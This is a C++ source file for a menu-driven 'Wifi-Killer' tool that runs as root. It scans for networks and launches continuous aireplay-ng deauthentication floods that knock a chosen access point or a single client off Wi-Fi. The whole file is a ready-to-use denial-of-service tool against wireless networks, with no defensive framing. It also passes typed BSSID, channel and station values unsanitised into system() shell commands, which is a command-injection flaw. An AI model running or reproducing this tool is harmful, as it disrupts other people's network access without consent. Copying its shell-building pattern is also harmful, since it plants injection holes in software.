#include <iostream>
#include <unistd.h>
#include <stdexcept>
#include <stdio.h>
#include <vector>

using namespace std;

string exec(string command) {
	char buffer[128];
	string result = "";
	FILE* pipe = popen(command.c_str(), "r");
	if (!pipe) throw runtime_error("popen() failed!");
	try {
		while ( fgets(buffer, sizeof(buffer), pipe) != NULL ) {
			result += buffer;
		}
	} catch (...) {
		pclose(pipe);
		throw;
	}
	pclose(pipe);
	return result;
}

int wifi(string adapter) {
	string bssid, ch, bssid2;
	int varr = 0;
	
	system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
	
	cout << "\n1-Scan networks\n2-Kill AP\n3-Deauth attack\n4-Exit\nWK>";
	cin  >> varr;
		
	if ( varr == 4 ) {
		system("clear");
		cout<<"Exiting...\n";
		system(("airmon-ng stop " + adapter +"mon").c_str());
		system("service network-manager start");
		return 0;
	} else if ( varr == 1 ) {
		system(("airodump-ng " + adapter + "mon").c_str());
		wifi(adapter);
	} else if ( varr == 2 ) {
		system("clear");
		system(("airodump-ng " + adapter + "mon").c_str());
		cout<<"Enter BSSID to kill\nWK>";
		cin>>bssid;
		cout<<"Enter channel where work AP\nWK>";
		cin>>ch;
		system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
		system("clear");
		cout<<"Kill atack started\n";
		sleep(3);
		system(("aireplay-ng --deauth 0 -a " + bssid + " " + adapter + "mon").c_str());
		system("clear");
		wifi(adapter);
	} else if ( varr == 3 ) {
		system(("airodump-ng " + adapter + "mon").c_str());
		cout<<"Enter BSSID to scan\nWK>";
		cin>>bssid;
		cout<<"Enter channel where work AP\nWK>";
		cin>>ch;
		system(("airodump-ng --bssid " + bssid + " -c " + ch + " " + adapter + "mon").c_str());
		cout<<"Enter the station\nWK>";
		cin>>bssid2;
		system(("aireplay-ng --deauth 0 -a " + bssid + " -c " + bssid2 + " " + adapter + "mon").c_str());
		system("clear");
		wifi(adapter);
	} else {
		cout<<"ERROR\n";
		sleep(3);
		system("clear");
		wifi(adapter);
	}
	return 0;
}

void clear() {
	std::cout << "\x1B[2J\x1B[H";
}

void showLogo() {
	system("toilet -s -w 150 -f mono12 -F metal Wifi-Killer");
}

bool checkRoot() {
	return getuid() ? false : true;
}

vector<string> split(const string& str, const string& delim)
{
    vector<string> tokens;
    size_t prev = 0, pos = 0;
    do
    {
        pos = str.find(delim, prev);
        if (pos == string::npos) pos = str.length();
        string token = str.substr(prev, pos-prev);
        if (!token.empty()) tokens.push_back(token);
        prev = pos + delim.length();
    }
    while (pos < str.length() && prev < str.length());
    return tokens;
}

vector<string> getNetworkDevices() {
	string ipLinkResult = exec("ip link show | awk --field-separator=': ' '{print $2}' | awk 'NF > 0' | tr '\n' ' '");
	return split(ipLinkResult, " ");
}

void printNetworkDevices(vector<string> devices) {
	int index = 0;
	for (auto i = devices.begin(); i != devices.end(); ++i) {
		index = distance(devices.begin(), i);
		cout << index + 1 << ": " << *i << endl;
	}
}

int main(int argc, char** argv) {
	vector<string> devices;
	int inputtedDevice = 0;
	
	clear();

	if ( checkRoot() ) {
		showLogo();
		system("airmon-ng check kill");
		devices = getNetworkDevices();
		printNetworkDevices(devices);
		cout << "Input index of needed device" << endl << "WK>";
		cin >> inputtedDevice;

		system(("airmon-ng start " + devices.at(inputtedDevice - 1)).c_str());
		system("clear");

		wifi(devices.at(inputtedDevice - 1));

		return 0;
	} else {
		cout << "Error!\n";
		cout << "Run wifi killer with sudo " << endl;
		return 1;
	}
}
